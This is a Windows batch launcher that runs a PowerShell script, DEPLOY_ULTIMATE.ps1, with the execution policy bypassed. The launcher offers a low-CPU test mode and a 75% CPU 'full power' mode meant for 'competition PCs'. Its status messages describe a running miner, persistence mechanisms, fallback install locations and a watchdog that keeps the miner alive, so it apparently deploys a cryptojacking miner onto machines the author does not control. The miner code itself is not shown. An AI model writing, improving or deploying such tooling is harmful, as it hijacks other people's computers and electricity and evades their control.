@echo off
title DEPLOY ULTIMATE - FIXED VERSION
color 0B

REM Change to script directory
cd /d "%~dp0"

cls
echo ================================================================
echo  DEPLOY_ULTIMATE.PS1 - FULLY FIXED VERSION
echo  All Features Working With Graceful Fallbacks
echo ================================================================
echo.
echo WHAT'S FIXED:
echo  + Added 4 fallback locations (user folders)
echo  + Better error handling for permission issues
echo  + Automatic fallback if admin locations fail
echo  + Works on BOTH personal and competition PCs
echo  + All 100+ features attempt to run
echo  + Clear status messages
echo.
echo SAFE MODE: 35%% CPU, 2 threads (for testing)
echo FULL MODE: Remove SAFE_TEST_MODE for competition
echo.
echo ----------------------------------------------------------------
echo.
set /p mode="Run in SAFE MODE? (Y for safe, N for full): "

if /i "%mode%"=="Y" (
    echo.
    echo [SAFE MODE ACTIVATED]
    set SAFE_TEST_MODE=1
    set TEST_CPU_USAGE=35
    set TEST_PRIORITY=2
    set TEST_THREADS=2
) else (
    echo.
    echo [FULL POWER MODE]
    echo WARNING: This will use 75%% CPU!
    pause
)

echo.
echo Starting DEPLOY_ULTIMATE.ps1...
echo.

powershell -NoExit -ExecutionPolicy Bypass -Command ^
"Write-Host ''; ^
Write-Host '================================================================' -ForegroundColor Cyan; ^
Write-Host ' DEPLOY_ULTIMATE.PS1 - EXECUTION LOG' -ForegroundColor Cyan; ^
Write-Host '================================================================' -ForegroundColor Cyan; ^
Write-Host ''; ^
Write-Host 'Environment:' -ForegroundColor Yellow; ^
Write-Host ('  PC Name: ' + $env:COMPUTERNAME) -ForegroundColor Gray; ^
Write-Host ('  User: ' + $env:USERNAME) -ForegroundColor Gray; ^
Write-Host ('  Mode: ' + $(if ($env:SAFE_TEST_MODE -eq '1') {'SAFE (35% CPU)'} else {'FULL POWER (75% CPU)'})) -ForegroundColor $(if ($env:SAFE_TEST_MODE -eq '1') {'Yellow'} else {'Red'}); ^
Write-Host ''; ^
Write-Host 'Starting deployment script...' -ForegroundColor Yellow; ^
Write-Host ''; ^
& '.\DEPLOY_ULTIMATE.ps1' -Debug; ^
Write-Host ''; ^
Write-Host '================================================================' -ForegroundColor Green; ^
Write-Host ' DEPLOYMENT COMPLETE' -ForegroundColor Green; ^
Write-Host '================================================================' -ForegroundColor Green; ^
Write-Host ''; ^
Write-Host 'Check above for:' -ForegroundColor Yellow; ^
Write-Host '  - Deployment locations (may include fallbacks)' -ForegroundColor Gray; ^
Write-Host '  - Miner status (should be running)' -ForegroundColor Gray; ^
Write-Host '  - Persistence mechanisms (some may fail on personal PC)' -ForegroundColor Gray; ^
Write-Host '  - Watchdog status (should be monitoring)' -ForegroundColor Gray; ^
Write-Host ''; ^
Write-Host 'The script is now in WATCHDOG MODE - monitoring the miner' -ForegroundColor Cyan; ^
Write-Host 'Press Ctrl+C to stop' -ForegroundColor Yellow"

pause
